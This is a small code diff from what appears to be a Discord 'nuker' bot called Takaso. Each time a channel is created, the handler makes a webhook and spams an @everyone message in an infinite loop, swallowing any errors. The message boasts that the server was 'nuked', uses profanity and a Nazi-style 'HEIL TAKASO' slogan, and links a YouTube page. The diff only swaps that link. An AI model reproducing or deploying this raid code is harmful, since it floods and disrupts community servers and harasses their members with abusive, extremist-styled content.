@@ -443,7 +443,7 @@ async def on_guild_channel_create(channel):
       webhook = await channel.create_webhook(name="Takaso")
       try:
           while True:
-              await webhook.send(content=" > Nuked by **Takaso**\n```py\n'Imagine having your surver fucked.'\n```\nhttps://www.youtube.com/watch?v=6HERu7qn1xg\n > **HEIL TAKASO**\n@everyone")
+              await webhook.send(content=" > Nuked by **Takaso**\n```py\n'Imagine having your surver fucked.'\n```\nhttps://www.youtube.com/channel/UCdYfkF4FrJIbOWpto0H4fyA\n > **HEIL TAKASO**\n@everyone")
       except:
           pass
 
